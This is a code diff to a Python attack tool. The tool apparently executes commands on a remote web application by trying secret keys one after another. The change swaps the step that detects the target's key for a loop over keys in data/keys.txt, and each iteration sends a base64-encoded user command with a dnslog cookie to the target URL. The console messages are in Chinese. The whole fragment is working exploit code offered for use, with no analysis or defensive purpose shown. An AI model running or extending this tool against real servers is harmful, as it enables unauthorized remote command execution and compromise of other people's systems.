@@ -13,19 +13,29 @@ def scripts(url, command):
         print("[-  存在敏感域名，停止检测，请使用其他工具或自行手工检测,抱歉")
         return
     print("[*] 开始遍历目标使用Key值,请稍等...")
+    """
     res_key = processor.find_target_key(url)
     if res_key:
-        print("[+] 目标使用key值: {}".format(res_key))
-        func = processor.get_dnslog_cookie()
-        print('[+] 执行命令: {} \n'.format(command))
-        time.sleep(1)
-        try:
-            base_command = processor.get_base64_command(command)
-            processor.process(url, base_command, res_key, func)
-        except Exception as err:
-            print(err)
+    """
+    with open('data/keys.txt', 'r') as k:
+        ke = k.readlines()
+        for i in ke:
+            x = i.strip('\n')
+            y = x.split(':')
+            res_key = y[0]
+            print("[+] 使用key值: {}".format(res_key))
+            func = processor.get_dnslog_cookie()
+            print('[+] 执行命令: {} \n'.format(command))
+            time.sleep(1)
+            try:
+                base_command = processor.get_base64_command(command)
+                processor.process(url, base_command, res_key, func)
+            except Exception as err:
+                print(err)
+    """
     else:
         print("[-]很遗憾没有找到目标使用的key")
+    """
 
 
 class Idea(object):
